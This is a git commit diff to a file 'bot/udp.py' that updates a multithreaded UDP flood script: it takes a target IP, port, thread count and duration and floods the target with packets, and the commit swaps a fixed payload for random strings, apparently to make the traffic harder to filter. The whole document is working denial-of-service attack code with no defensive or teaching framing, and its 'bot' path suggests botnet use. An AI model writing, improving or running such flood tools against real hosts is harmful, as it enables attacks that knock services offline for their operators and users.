7881b339aba0157f0c766213e73340d98c02dd45
ZeronX <160329349+zeronxdev@users.noreply.github.com>
2024-04-11 11:29:09 +0700

    Update udp.py

--- bot/udp.py
+++ bot/udp.py
@@ -1,7 +1,12 @@
 import socket
 import threading
 import time
-import sys  
+import sys
+import random
+
+def generate_random_string(length):
+    letter_bytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    return ''.join(random.choice(letter_bytes) for _ in range(length))
 
 def udp_flood(target_ip, target_port, payload, duration):
     udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -10,6 +15,7 @@ def udp_flood(target_ip, target_port, payload, duration):
     while time.time() < end_time:
         udp_socket.sendto(payload, (target_ip, target_port))
     udp_socket.close()
+
 def main():
     if len(sys.argv) != 5:
         print("Usage: python script.py <target_ip> <target_port> <num_threads> <duration>")
@@ -19,7 +25,8 @@ def main():
     target_port = int(sys.argv[2])
     num_threads = int(sys.argv[3])
     duration = int(sys.argv[4])
-    payload = b'X' * 1024
+    payload = generate_random_string(1024).encode()
+
     threads = []
     for _ in range(num_threads):
         thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, payload, duration))
@@ -31,5 +38,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-
